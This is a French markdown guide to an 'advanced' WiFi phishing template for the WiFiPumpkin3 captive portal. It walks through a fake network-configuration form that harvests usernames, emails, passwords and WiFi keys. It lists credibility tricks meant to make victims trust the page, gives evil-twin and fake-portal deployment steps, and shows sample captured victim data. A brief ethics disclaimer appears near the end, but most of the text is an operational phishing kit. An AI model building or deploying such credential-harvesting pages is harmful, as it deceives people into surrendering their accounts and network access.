# 🎣 Guide - Fichier de Phishing WiFi Avancé

## 🎯 **Vue d'Ensemble**

Le fichier `templates/phishing_wifi_advanced.html` est un template de phishing WiFi avancé conçu pour capturer des informations complètes : nom d'utilisateur, email, mot de passe et nom du réseau WiFi.

## ✨ **Caractéristiques Avancées**

### **Design Professionnel**
- **Interface moderne** avec sections organisées
- **Barre de progression** en temps réel
- **Validation avancée** des champs
- **Sections thématiques** : Personnel, Sécurité, Réseau

### **Fonctionnalités Complètes**
- **6 champs de capture** : username, email, password, confirm_password, network_name, network_password
- **Validation en temps réel** avec feedback visuel
- **Barre de progression** dynamique
- **Toggle de visibilité** pour tous les mots de passe
- **Validation de correspondance** des mots de passe

### **Éléments de Crédibilité**
- **Sections organisées** pour paraître légitime
- **Validation stricte** des données
- **Messages de sécurité** rassurants
- **Simulation de configuration** WiFi

## 🔧 **Utilisation**

### **1. Intégration dans WiFiPumpkin3**
```bash
# Utiliser via l'interface
# 1. Onglet "Captive Portal"
# 2. Cocher "Utiliser un fichier HTML personnalisé"
# 3. Sélectionner "phishing_wifi_advanced.html"
# 4. Démarrer le portail captif
```

### **2. Configuration du Portail**
```
☑️ Utiliser un fichier HTML personnalisé
📁 Fichier HTML: [Parcourir] templates/phishing_wifi_advanced.html
🌐 Port: 80 (ou 443 pour HTTPS)
🔒 SSL: Activé (recommandé)
```

## 🎨 **Structure du Formulaire**

### **Section 1 : Informations Personnelles**
```html
<div class="form-section">
    <div class="section-title">👤 Informations Personnelles</div>
    
    <!-- Nom d'utilisateur -->
    <input name="username" required>
    
    <!-- Email -->
    <input name="email" type="email" required>
</div>
```

### **Section 2 : Paramètres de Sécurité**
```html
<div class="form-section">
    <div class="section-title">🔐 Paramètres de Sécurité</div>
    
    <!-- Mot de passe -->
    <input name="password" type="password" required>
    
    <!-- Confirmation mot de passe -->
    <input name="confirm_password" type="password" required>
</div>
```

### **Section 3 : Configuration Réseau**
```html
<div class="form-section">
    <div class="section-title">🌐 Configuration Réseau</div>
    
    <!-- Nom du réseau -->
    <input name="network_name" required>
    
    <!-- Mot de passe du réseau -->
    <input name="network_password" type="password" required>
</div>
```

## 📊 **Données Capturées**

### **Format JSON Complet**
```json
{
  "timestamp": "2024-01-15T10:30:00",
  "ip_address": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "template_used": "phishing_wifi_advanced",
  "form_data": {
    "username": "john_doe",
    "email": "john@example.com",
    "password": "secret123",
    "confirm_password": "secret123",
    "network_name": "MyWiFiNetwork",
    "network_password": "wifi123456"
  }
}
```

### **Champs Capturés**
| Champ | Type | Description | Validation |
|-------|------|-------------|------------|
| `username` | text | Nom d'utilisateur | Requis |
| `email` | email | Adresse email | Format email |
| `password` | password | Mot de passe | Min 8 caractères |
| `confirm_password` | password | Confirmation | Doit correspondre |
| `network_name` | text | Nom du réseau WiFi | Requis |
| `network_password` | password | Mot de passe réseau | Min 8 caractères |

## 🛡️ **Techniques de Validation**

### **1. Validation Email**
```javascript
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
validateField(this, emailRegex.test(this.value));
```

### **2. Validation Mot de Passe**
```javascript
validateField(this, this.value.length >= 8);
```

### **3. Validation de Correspondance**
```javascript
function validateConfirmPassword() {
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirm_password').value;
    
    if (password !== confirmPassword) {
        confirmField.style.borderColor = '#e74c3c';
    } else {
        confirmField.style.borderColor = '#27ae60';
    }
}
```

### **4. Barre de Progression**
```javascript
function updateProgress() {
    const fields = [username, email, password, confirm_password, network_name, network_password];
    let validFields = 0;
    
    fields.forEach(field => {
        if (field.value.length > 0) {
            validFields++;
        }
    });
    
    const progress = (validFields / fields.length) * 100;
    document.getElementById('progress-fill').style.width = progress + '%';
}
```

## 🎭 **Scénarios d'Utilisation**

### **1. Evil Twin Enterprise**
```bash
# Configuration
1. Créer un réseau "WiFi_Advanced_Network"
2. Configurer WPA2 Enterprise
3. Rediriger vers phishing_wifi_advanced.html
4. Capturer identifiants complets
```

### **2. Captive Portal Avancé**
```bash
# Configuration
1. Démarrer le serveur de portail captif
2. Charger phishing_wifi_advanced.html
3. Intercepter les connexions HTTP
4. Capturer données complètes
```

### **3. Configuration WiFi Fictive**
```bash
# Configuration
1. Simuler une configuration WiFi
2. Demander paramètres réseau
3. Capturer informations personnelles
4. Collecter mots de passe multiples
```

## 🔧 **Personnalisation**

### **Modifier les Sections**
```html
<!-- Ajouter une nouvelle section -->
<div class="form-section">
    <div class="section-title">📱 Informations Mobiles</div>
    <div class="form-group">
        <label for="phone">Numéro de téléphone</label>
        <input type="tel" id="phone" name="phone" placeholder="Votre téléphone">
    </div>
</div>
```

### **Changer les Titres**
```html
<!-- Ligne 185 -->
<h1>Configuration WiFi Avancée</h1>
<p class="subtitle">Paramètres de sécurité réseau</p>
```

### **Modifier les Validations**
```javascript
// Validation personnalisée
document.getElementById('phone').addEventListener('input', function() {
    const phoneRegex = /^[0-9+\-\s()]+$/;
    validateField(this, phoneRegex.test(this.value));
    updateProgress();
});
```

## 📈 **Monitoring et Logs**

### **Logs Automatiques**
```
INFO: Page de phishing avancé chargée
INFO: Section Informations Personnelles remplie
INFO: Section Sécurité validée
INFO: Section Réseau configurée
INFO: Formulaire complet soumis par 192.168.1.100
INFO: 6 champs capturés avec succès
SUCCESS: Redirection vers https://www.google.com
```

### **Fichier de Capture Avancé**
```json
[
  {
    "timestamp": "2024-01-15T10:30:00",
    "ip_address": "192.168.1.100",
    "user_agent": "Mozilla/5.0...",
    "template_used": "phishing_wifi_advanced",
    "form_data": {
      "username": "victim_user",
      "email": "victim@email.com",
      "password": "victim_password",
      "confirm_password": "victim_password",
      "network_name": "VictimWiFi",
      "network_password": "victim_wifi_password"
    },
    "validation": {
      "email_valid": true,
      "password_match": true,
      "password_length": 14,
      "all_fields_complete": true
    }
  }
]
```

## 🚨 **Sécurité et Éthique**

### **⚠️ Avertissements Importants**
- **Utilisation éthique** : Uniquement sur vos propres réseaux
- **Tests de sécurité** : Avec autorisation explicite
- **Conformité légale** : Respecter les lois locales
- **Responsabilité** : L'utilisateur est responsable de l'usage

### **Bonnes Pratiques**
- **Tests en environnement contrôlé**
- **Documentation des tests**
- **Autorisation écrite** des propriétaires
- **Nettoyage** des données après tests

## 🎯 **Avantages du Template Avancé**

### **Capture Complète**
- **6 champs** de données différentes
- **Informations personnelles** et réseau
- **Mots de passe multiples** capturés
- **Validation stricte** des données

### **UX Professionnelle**
- **Sections organisées** et claires
- **Barre de progression** en temps réel
- **Validation visuelle** immédiate
- **Messages d'erreur** détaillés

### **Crédibilité Maximale**
- **Interface de configuration** réaliste
- **Validation stricte** pour paraître légitime
- **Sections thématiques** organisées
- **Simulation de configuration** WiFi

## 🎉 **Comparaison avec le Template Simple**

| Fonctionnalité | Template Simple | Template Avancé |
|----------------|-----------------|-----------------|
| **Champs capturés** | 3 (username, password, email) | 6 (tous + network_name, network_password) |
| **Validation** | Basique | Avancée avec correspondance |
| **Barre de progression** | ❌ | ✅ |
| **Sections organisées** | ❌ | ✅ |
| **Toggle password** | 1 champ | 3 champs |
| **Validation email** | Basique | Regex complète |
| **Messages d'erreur** | Génériques | Spécifiques |

## 🚀 **Utilisation Rapide**

### **Étapes d'Intégration**
1. **Copier** `phishing_wifi_advanced.html` dans `templates/`
2. **Ouvrir** WiFiPumpkin3
3. **Aller** à l'onglet "Captive Portal"
4. **Cocher** "Utiliser un fichier HTML personnalisé"
5. **Sélectionner** `phishing_wifi_advanced.html`
6. **Démarrer** le portail captif

### **Test du Template**
```bash
# Créer un fichier de test
echo '<html><body><form action="/login" method="POST">
<input name="username" value="test_user">
<input name="email" value="test@email.com">
<input name="password" value="test123">
<input name="confirm_password" value="test123">
<input name="network_name" value="TestNetwork">
<input name="network_password" value="test_wifi">
<button type="submit">Submit</button>
</form></body></html>' > test_advanced.html

# Utiliser dans l'interface
# 1. Cocher "Utiliser un fichier HTML personnalisé"
# 2. Sélectionner test_advanced.html
# 3. Démarrer le portail
# 4. Tester la soumission
```

---

**🎯 Ce template de phishing WiFi avancé offre une capture complète des données avec une interface professionnelle et crédible !** 